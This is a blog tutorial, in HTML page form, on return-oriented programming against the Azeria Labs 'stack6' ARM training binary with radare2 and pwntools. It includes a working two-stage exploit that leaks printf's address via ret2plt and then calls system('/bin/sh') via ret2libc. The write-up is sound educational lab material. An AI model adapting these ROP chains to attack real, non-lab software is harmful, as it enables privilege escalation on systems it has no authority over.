@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+         
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>ROP on ARM with radare2</title>
+        <style>
+
+    html body {
+        font-family: 'Raleway', sans-serif;
+        background-color: white;
+    }
+
+    :root {
+        --accent: #ffe135;
+        --border-width:  5px ;
+    }
+
+</style>
+
+
+
+
+
+<link rel="stylesheet" href="https://bananamafia.dev//css/font.css">
+
+
+ <link rel="stylesheet" href="https://bananamafia.dev//css/solarized-dark.min.css"> 
+
+
+<link rel="stylesheet" href="https://bananamafia.dev//css/bootstrap-min.css" integrity="">
+
+
+<link rel="stylesheet" href="https://bananamafia.dev//css/main.css">
+
+
+<link rel="stylesheet" href="https://bananamafia.dev//css/font-awesome.min.css" integrity="">
+ 
+
+
+<script src="https://bananamafia.dev/js/highlight.min.js"></script>
+
+
+<script src="https://bananamafia.dev/js/python.min.js"></script> 
+<script src="https://bananamafia.dev/js/cpp.min.js"></script> 
+<script src="https://bananamafia.dev/js/json.min.js"></script> 
+<script src="https://bananamafia.dev/js/go.min.js"></script> 
+
+<script>
+  hljs.initHighlightingOnLoad();
+</script>
+
+
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-143157939-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag() { dataLayer.push(arguments); }
+  gtag('js', new Date());
+
+  gtag('config', 'UA-143157939-1');
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="https://bananamafia.dev/js/jquery.min.js"></script>
+
+
+<script src="https://bananamafia.dev/js/bootstrap.min.js"></script>
+
+
+<script>$(document).on('click', function () { $('.collapse').collapse('hide'); })</script> <meta name="generator" content="Hugo 0.59.0" />
+        
+
+        
+    </head>
+
+    
+
+
+    <body>
+         
+        <nav class="navbar navbar-default navbar-fixed-top">
+
+            <div class="container">
+
+                <div class="navbar-header">
+
+                    <a class="navbar-brand visible-xs" href="#">ROP on ARM with radare2</a>
+
+                    <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+
+                </div>
+
+                <div class="collapse navbar-collapse">
+
+                    
+                        <ul class="nav navbar-nav">
+                            
+                                <li><a href="/">Home</a></li>
+                            
+                                <li><a href="/post/">Posts</a></li>
+                            
+                                <li><a href="/project/">Projects</a></li>
+                            
+                        </ul>
+                    
+
+                    
+                        <ul class="nav navbar-nav navbar-right">
+                            
+                                <li class="navbar-icon"><a href="mailto:ps1337@mailbox.org"><i class="fa fa-envelope-o"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://github.com/ps1337/"><i class="fa fa-github"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://twitter.com/CaptnBanana"><i class="fa fa-twitter"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="/index.xml"><i class="fa fa-rss"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://www.youtube.com/watch?v=QKWKUU0XQ8U"><i class="fa fa-envira"></i></a></li>
+                            
+                        </ul>
+                    
+
+                </div>
+
+            </div>
+
+        </nav>
+
+
+<main>
+
+    <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="/post/rop-arm-1/">ROP on ARM with radare2</a></h4>
+    <h5>November 19, 2019</h5>
+    
+    <a href="https://bananamafia.dev/tags/r2"><kbd class="item-tag">r2</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/radare2"><kbd class="item-tag">radare2</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/rop"><kbd class="item-tag">rop</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/exploitation"><kbd class="item-tag">exploitation</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/arm"><kbd class="item-tag">arm</kbd></a>
+    
+
+</div>
+
+
+    <br>
+    <div class="content-width text-justify">
+
+<p>Exploit development on ARM with <code>radare2</code> seems like a great idea until you start searching for resources, searching for a nice and automated debugging setup. Here&rsquo;s what I&rsquo;ve found:</p>
+
+<p><marquee>nothing</marquee></p>
+
+<p>Cool. That&rsquo;s the reason why this post covers the setup I came up with, as well as basics for ROP on the ARM architecture. The exploit target is <code>stack6</code> from <a href="https://azeria-labs.com/part-3-stack-overflow-challenges/">Azeria Labs</a> and <code>radare2</code> will be used as a debugger. If you&rsquo;re a beginner I suggest reading the ARM assembly basics <a href="https://azeria-labs.com/writing-arm-assembly-part-1/">on the same site</a> first before starting the challenges from the beginning with <code>stack0</code>. The exploitation techniques covered in this post are ROP, ret2plt and ret2libc.</p>
+
+<h1 id="emulation-vs-real-hardware">Emulation VS Real Hardware</h1>
+
+<p>Many people are using a QEMU-based virtual ARM machine for research and exploitation purposes. If you want to go this way, check out <a href="https://azeria-labs.com/emulate-raspberry-pi-with-qemu/">this guide</a>.</p>
+
+<p>However, I&rsquo;m a fan of using real hardware. That&rsquo;s why I&rsquo;m using a BananaPi (of course) with ARMbian. In order to use the debugging setup I came up with it doesn&rsquo;t really matter whether you&rsquo;re using real or emulated hardware though. It&rsquo;s just a matter of preference - the only requirements are having SSH access and <code>gdbserver</code> installed on the ARM machine.</p>
+
+<h1 id="remote-debugging-with-radare2">Remote Debugging With <code>radare2</code></h1>
+
+<p>My setup is based on the fact that <code>radare2</code> is able to connect to a remote <code>gdbserver</code>, as described in the <a href="https://github.com/radareorg/radare2/blob/master/doc/gdb.md">documentation</a> and the <a href="https://radare.gitbooks.io/radare2book/debugger/remote_gdb.html">radare book</a>.</p>
+
+<p>On the remote machine, you would run <code>gdbserver :1337 ./stack6</code> and the following command on your machine to connect to it:</p>
+
+<pre><code>$ r2 -e dbg.exe.path=&lt;local path to stack6&gt; -a arm -b 32 -d gdb://bananapi:1337
+</code></pre>
+
+<p>This works pretty good for a first test but passing input to the debugee (yes, that word exists) dynamically is a pain and it&rsquo;s not really comfortable as it could be. Dynamically passing a second stage payload based on previous debugee output can be a requirement sometimes, as you will see shortly.</p>
+
+<h1 id="adding-pwntools">Adding <code>pwntools</code></h1>
+
+<p>Luckily I&rsquo;ve already created a wrapper around the exploitation library <a href="https://github.com/Gallopsled/pwntools">pwntools</a> that allows spawning <code>radare2</code> instead of <code>gdb</code> automatically. You can find it <a href="https://github.com/ps1337/pwntools-r2">here</a>. The only thing that has to be changed in order to make this work with remote ARM machines is the networking part.</p>
+
+<p>According to the <a href="http://docs.pwntools.com/en/stable/gdb.html">documentation</a>, the <code>gdb.debug()</code> function of <code>pwntools</code> already accepts an <code>ssh</code> parameter that performs remote debugging. Let&rsquo;s put it together:</p>
+
+<pre><code class="language-python">#!/usr/bin/env python2
+
+# Import pwntools
+from pwn import *
+
+# My wrapper module
+# install via `pip install pwntools-r2`
+# I recommend using a pipenv
+from pwntools_r2 import *
+
+# You can also use a private key here
+shell = ssh(user='root', host='bananapi', port=22, password=&quot;bananaboii&quot;)
+
+# Automatically execute r2 instructions after starting the debugging session:
+# 1. Launch analysis
+# 2. Run until the vulnerable function is called
+# 3. Switch to visual debugger
+r2script = &quot;&quot;&quot;
+#r2.cmd('aa')
+#r2.cmd('dc')
+#r2.cmd('dcu sym.getpath')
+#r2.cmd('V!')
+&quot;&quot;&quot;
+
+# With path of the binary on the remote host
+p = r2dbg('/root/ARM-challenges/stack6', r2script=r2script, ssh=shell)
+
+p.sendline(&quot;1337&quot;)
+print &quot;[*] &quot; + p.recvline()
+
+# Prevent from exiting
+p.interactive()
+</code></pre>
+
+<p><em>Note that I&rsquo;m using</em> <code>dcu</code> <em>(debug continue until) instead of breakpoints since these didn&rsquo;t work for me out of the box.</em></p>
+
+<p>So you only have to check out the readme of my <code>pwntools-r2</code> module <a href="https://github.com/ps1337/pwntools-r2">here</a>, add the optional <code>ssh</code> parameter and the debugging setup is ready:</p>
+
+<p><img src="/img/rop-arm-1/rop-arm-1-demo.gif" alt="Demo" /></p>
+
+<p>Here&rsquo;s what&rsquo;s happening in detail:</p>
+
+<ol>
+<li>Login on the remote ARM machine</li>
+<li>Pull the binary to be exploited to the local machine</li>
+<li>Launch a <code>gdbserver</code> with the target on the remote machine</li>
+<li>Attach <code>radare2</code> to the <code>gdbserver</code> via the SSH tunnel</li>
+<li>Give the local copy of the exploit target to <code>radare2</code> for analysis stuff</li>
+</ol>
+
+<p>And you only have to install one Python module and copy a few lines of code.</p>
+
+<h1 id="building-the-exploit">Building the exploit</h1>
+
+<p>From this point on, all debugging commands are related to <code>radare2</code>.</p>
+
+<h2 id="checking-the-binary">Checking The Binary</h2>
+
+<p>Let&rsquo;s view the binary information first:</p>
+
+<pre><code>[0x000104d8]&gt; i
+[...]
+arch     arm
+baddr    0x10000
+bintype  elf
+bits     32
+canary   false
+endian   little
+nx       false
+pic      false
+relro    no
+static   false
+stripped false
+[...]
+</code></pre>
+
+<p>There&rsquo;s no stack canary, an executable stack and no PIC (Position Independent Code). Having PIC would prevent the exploit from using ret2plt, as I already described <a href="https://bananamafia.dev/post/binary-rop-stackpivot/">in a previous blog post</a>. The essence is that the GOT address of functions isn&rsquo;t static for PIC binaries since the whole binary is loaded at a random address in memory:</p>
+
+<p><em>Position independent functions accessing global data start by determining the absolute address of the GOT given their own current program counter value</em>  (from <a href="https://en.wikipedia.org/wiki/Position-independent_code">Wikipedia</a>)</p>
+
+<p>The goal for the <code>stack6</code> challenge is to spawn a (local) shell. Imagine it&rsquo;s a SUID binary and if you can cause the application to spawn a shell you&rsquo;ve escalated privileges.</p>
+
+<p>The target asks for a path as input and prints it afterwards before exiting:</p>
+
+<pre><code>root@bananapi:~/ARM-challenges# ./stack6
+input path please: yolo
+got path yolo
+</code></pre>
+
+<h2 id="getting-pc-control">Getting PC control</h2>
+
+<p>I often start off by sending a large pattern to the target. To create a pattern, <code>ragg2</code> that&rsquo;s bundled with <code>radare2</code> can be used:</p>
+
+<pre><code>$ ragg2 -r -P 150
+AAABAACAADAA[...]
+</code></pre>
+
+<p>Let&rsquo;s integrate it into the debugging setup by changing the <code>p.sendline()</code> call and debug it:</p>
+
+<ol>
+<li>The target executes <code>gets()</code> to read user input in a function called <code>getpath()</code></li>
+<li>At the end of <code>getpath()</code> <code>(0x0001054c)</code> it executes <code>pop {r4, fp, pc}</code> which loads the instruction pointer (<code>pc</code>) from the stack.</li>
+<li>This value is under our control and is currently filled with <code>0x41416241</code></li>
+</ol>
+
+<p>The offset of this value in the pattern can be determined right from the <code>radare2</code> debugging session:</p>
+
+<pre><code>[0x00010548]&gt; wop?
+Usage: wop[DO]   len @ addr | value
+| wopD len [@ addr]   Write a De Bruijn Pattern of length 'len' at address 'addr'
+| wopD* len [@ addr]  Show wx command that creates a debruijn pattern of a specific length
+| wopO value          Finds the given value into a De Bruijn Pattern at current offset
+[0x00010548]&gt; wopO 0x41416241
+80
+</code></pre>
+
+<p>Therefore the correct offset to overwrite PC is 80.</p>
+
+<h2 id="utilizing-ret2plt-and-ret2libc">Utilizing ret2plt and ret2libc</h2>
+
+<p>The easiest way to spawn a shell in this scenario involves calling <code>system(&quot;/bin/sh&quot;)</code> using ret2libc. For this to work, the start address of libc has to be determined. Otherwise the correct addresses of both <code>system()</code> and the <code>/bin/sh</code> string can&rsquo;t be predicted because of ASLR.</p>
+
+<p>With ret2plt it becomes possible to leak the address of a function at runtime without crashing the process. This means that the leaked information allows crafting a second stage payload that will spawn a shell in a second exploitation interaction.</p>
+
+<p>I&rsquo;ve chosen to leak the address of <code>printf</code> because it&rsquo;s being used by the target itself. The target has to be forced to execute <code>printf@PLT(printf@GOT)</code> - this will then print and therefore leak the address of <code>printf</code> at runtime. The addresses of both <code>printf@PLT</code> and <code>printf@GOT</code> are fixed: Remember, no PIC?</p>
+
+<p>Ok how to execute this call in this scenario? The <a href="https://static.docs.arm.com/ihi0042/g/aapcs32.pdf">calling convention</a> (from page 18) describes that the <code>r0</code>, <code>r1</code>, <code>r2</code> and <code>r3</code> registers are argument registers, while <code>r0</code> is the first argument. This means that in our scenario <code>r0</code> has to be populated accordingly while the other argument registers have to be zeroed. Since arguments are passed using registers, ROP has to be used to perform this call.</p>
+
+<h3 id="searching-for-rop-gadgets">Searching For ROP Gadgets</h3>
+
+<p>Let&rsquo;s search for fitting ROP gadgets. <code>radare2</code> can do this with <code>/R</code>:</p>
+
+<pre><code class="language-bash">[0x00010548]&gt; /R
+0x000105dc  f883bde8  pop {r3, r4, r5, r6, r7, r8, sb, pc}
+[...]
+0x000105c4  0700a0e1  mov r0, r7
+0x000105c8  0810a0e1  mov r1, r8
+0x000105cc  0920a0e1  mov r2, sb
+0x000105d0  33ff2fe1  blx r3
+0x000105d4  060054e1  cmp r4, r6
+0x000105d8  f7ffff1a  bne 0x105bc
+0x000105dc  f883bde8  pop {r3, r4, r5, r6, r7, r8, sb, pc}
+[...]
+</code></pre>
+
+<p>The two gadgets listed above are interesting:</p>
+
+<ol>
+<li>The first one can be used to populate various registers, including the instruction pointer</li>
+<li>With the second one the remaining registers can be populated and <code>blx r3</code> also calls a function</li>
+</ol>
+
+<p><em>(The first gadget is present in the second one, I&rsquo;ve listed it in there too for a better context)</em></p>
+
+<h3 id="leaking-the-address">Leaking The Address</h3>
+
+<p>The approach is to chain these two gadgets to populate the registers accordingly. This allows calling <code>printf@PLT(printf@GOT)</code> and returning to the application entry point afterwards for a second exploitation stage.</p>
+
+<p>I came up with this ROP chain for the first stage:</p>
+
+<pre><code class="language-python">POP = 0x000105dc # First gadget
+MOV_CALL = 0x000105c4 # Second gadget
+
+payload = &quot;&quot;
+payload += &quot;A&quot; * EIP_OFFSET # or PC_OFFSET :)
+
+# initial register load
+payload += p32(POP)
+
+# leak printf address
+payload += p32(PRINTF_PLT)  # r3 - will be called
+payload += p32(0)  # r4
+payload += p32(0)  # r5
+payload += p32(0)  # r6
+payload += p32(PRINTF_GOT)  # r7 - will be the first parameter
+payload += p32(0)  # r8
+payload += p32(0)  # sb
+payload += p32(MOV_CALL)  # pc
+
+# continue after end of MOV_CALL
+# flush the stdout buffer
+payload += p32(FFLUSH_PLT)  # r3; will be called with all zeroes as parameters
+payload += p32(0)  # r4
+payload += p32(0)  # r5
+payload += p32(0)  # r6
+payload += p32(0)  # r7
+payload += p32(0)  # r8
+payload += p32(0)  # sb
+payload += p32(MOV_CALL)  # pc
+
+# return to the entry point for re-exploitation
+# --&gt; exploit using previous leak of address
+payload += p32(ENTRY)  # r3 - return to entry point
+payload += p32(0)  # r4
+payload += p32(0)  # r5
+payload += p32(0)  # r6
+payload += p32(0)  # r7
+payload += p32(0)  # r8
+payload += p32(0)  # sb
+payload += p32(MOV_CALL)  # pc
+</code></pre>
+
+<p>The call to the <code>POP</code> gadget causes the subsequent values to be loaded into the registers accordingly. The <code>r3</code> value is being used in the second gadget (<code>MOV_CALL</code>) as call address. This second gadget also causes <code>r7</code> to be moved to <code>r0</code>, which is the first argument for <code>printf@PLT</code>. The address of <code>printf@GOT</code> is therefore loaded in there.</p>
+
+<p>I had to call <code>fflush</code> using the same register setup approach because otherwise nothing was printed. The <code>r0</code> register has to be zeroed before that call or otherwise a <code>[r0]</code> dereference happens and everything crashes.</p>
+
+<p>Now, from <code>pwntools</code>, the 4 byte output of the target an be read and converted into an integer value:</p>
+
+<pre><code># Address is a 32 bit integer
+PRINTF_ADDR = u32(p.recv(4))
+print &quot;[*] Got addr: &quot; + str(hex(PRINTF_ADDR))
+</code></pre>
+
+<p>After printing this, the application will return to its entry point (<code>ENTRY</code> value from above) to cause it to read another value from <code>stdin</code> for another round of exploitation. The value of the entry point address was determined with <code>ieq</code>.</p>
+
+<h3 id="calculating-addresses">Calculating Addresses</h3>
+
+<p>Now we know that <code>printf()</code> resides at a certain address. With knowledge of the libc version in use, it&rsquo;s now possible to calculate the start address of libc and therefore the address of every function that&rsquo;s present in there. For this calculation, some offsets have to be known first:</p>
+
+<pre><code>$ nm -D /lib/arm-linux-gnueabihf/libc.so.6 | grep printf
+[...]
+00038204 T printf # printf offset
+[...]
+$ nm -D /lib/arm-linux-gnueabihf/libc.so.6 | grep system
+[...]
+0002d4dc W system # system offset
+[...]
+$ strings -tx /lib/arm-linux-gnueabihf/libc.so.6 | grep &quot;/bin/sh&quot;
+d5f5c /bin/sh
+</code></pre>
+
+<p>This could be done directly from <code>radare2</code>, but in remote debugging sessions this didn&rsquo;t work that good for me :)</p>
+
+<p>With this information the required addresses can be calculated dynamically:</p>
+
+<pre><code class="language-python">LIBC_BASE = PRINTF_ADDR - PRINTF_OFFSET
+BINSH_ADDR = LIBC_BASE + BINSH_OFFSET
+SYSTEM_ADDR = LIBC_BASE + SYSTEM_OFFSET
+</code></pre>
+
+<h3 id="getting-a-shell">Getting A Shell</h3>
+
+<p>Now, in a second stage and without terminating the target, the following payload is sent:</p>
+
+<pre><code>payload = &quot;&quot;
+payload += &quot;A&quot; * EIP_OFFSET
+
+# initial load of registers, including pc
+payload += p32(POP)  # pc
+
+payload += p32(SYSTEM_ADDR)  # r3
+payload += p32(0x0)  # r4
+payload += p32(0x0)  # r5
+payload += p32(0x0)  # r6
+payload += p32(BINSH_ADDR)  # r7 - parameter
+payload += p32(0x0)  # r8
+payload += p32(0x0)  # sb
+payload += p32(MOV_CALL)  # pc
+
+p.sendline(payload)
+
+# Catch the shell
+p.interactive()
+</code></pre>
+
+<p>This is pretty straight forward If you&rsquo;ve understood the previous ROP chain. This input overflows the buffer again and redirects the execution flow to the <code>POP</code> gadget. After populating all registers, <code>system(&quot;/bin/sh&quot;)</code> is getting called via the <code>blx r3</code> instruction in the <code>MOV_CALL</code> gadget:</p>
+
+<p><img src="/img/rop-arm-1/rop-arm-1-1.gif" alt="Shellz" /></p>
+
+<p><center>
+    <b>That&rsquo;s it!</b>
+</center></p>
+</div>
+
+    
+    
+
+    
+
+    <h4 class="page-header">Related</h4>
+
+     <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="/post/r2wars-2019/">How Not To Suck At r2wars</a></h4>
+    <h5>October 1, 2019</h5>
+    
+    <a href="https://bananamafia.dev/tags/radare2"><kbd class="item-tag">radare2</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/r2"><kbd class="item-tag">r2</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/r2wars"><kbd class="item-tag">r2wars</kbd></a>
+    
+
+</div>
+  <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="/post/r2frida-1/">Dynamic Instrumentation: Frida And r2frida For Noobs</a></h4>
+    <h5>September 13, 2019</h5>
+    
+    <a href="https://bananamafia.dev/tags/radare2"><kbd class="item-tag">radare2</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/r2"><kbd class="item-tag">r2</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/frida"><kbd class="item-tag">frida</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/r2frida"><kbd class="item-tag">r2frida</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/reverse-engineering"><kbd class="item-tag">reverse-engineering</kbd></a>
+    
+
+</div>
+  <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="/post/r2ctf-2019/">r2con 2019 CTF Writeups</a></h4>
+    <h5>September 2, 2019</h5>
+    
+    <a href="https://bananamafia.dev/tags/r2"><kbd class="item-tag">r2</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/radare2"><kbd class="item-tag">radare2</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/reverse-engineering"><kbd class="item-tag">reverse-engineering</kbd></a>
+    
+
+</div>
+ 
+
+    <footer>
+    <img style="width:42vh" src="/img/tag.png">
+
+    <p class="copyright text-muted">
+
+        &copy; All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a>
+    </p>
+</footer>
+</body>
+
+</html>
+    
+
+</main>
